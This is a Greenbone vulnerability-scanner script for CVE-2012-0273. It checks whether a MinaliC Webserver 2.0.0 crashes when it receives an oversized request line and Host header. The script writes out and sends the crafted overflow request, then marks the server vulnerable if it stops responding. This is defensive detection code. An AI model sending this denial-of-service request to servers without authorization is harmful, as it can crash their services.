# SPDX-FileCopyrightText: 2013 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.803192");
  script_version("2023-07-21T05:05:22+0000");
  script_cve_id("CVE-2012-0273");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"2023-07-21 05:05:22 +0000 (Fri, 21 Jul 2023)");
  script_tag(name:"creation_date", value:"2013-04-16 13:14:39 +0530 (Tue, 16 Apr 2013)");
  script_name("MinaliC Host Header Handling Remote Buffer Overflow Vulnerability");

  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/24958/");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/52873");
  script_xref(name:"URL", value:"http://packetstormsecurity.com/files/121296/");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (C) 2013 Greenbone AG");
  script_family("Buffer overflow");
  script_dependencies("gb_get_http_banner.nasl");
  script_require_ports("Services/www", 8080);
  script_mandatory_keys("minaliC/banner");

  script_tag(name:"impact", value:"Successful exploitation will let the remote unauthenticated
  attackers to cause a buffer overflow, resulting in a denial of service or
  potentially allowing the execution of arbitrary code.");

  script_tag(name:"affected", value:"MinaliC Webserver version 2.0.0");

  script_tag(name:"insight", value:"The issue is due to user-supplied input is not properly
  validated when handling a specially crafted host header in the request.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore.
  General solution options are to upgrade to a newer release, disable respective
  features, remove the product or replace the product by another one.");

  script_tag(name:"summary", value:"MinaliC Webserver is prone to a buffer overflow vulnerability.");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"qod_type", value:"remote_analysis");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");

port = http_get_port(default:8080);

banner = http_get_remote_headers(port: port);
if("Server: MinaliC" >!< banner){
  exit(0);
}

## Cross Confirm the application
res = http_get_cache(item:"/", port:port);
if("Server: MinaliC" >!< res) {
  exit(0);
}

junk = crap(data:"0x41", length:245) + "[.|";
host = crap(data:"0x90", length:61);

req = string("GET ", junk , " HTTP/1.1\r\n",
             "Host: ", host, "\r\n\r\n");

## Send crafted data to server
res = http_send_recv(port:port, data:req);
res = http_send_recv(port:port, data:req);

## server is died and it's vulnerable
req = http_get(item:"/", port:port);
res = http_keepalive_send_recv(port:port, data:req);
if("Server: MinaliC" >!< res) {
  security_message(port:port);
  exit(0);
}

exit(99);
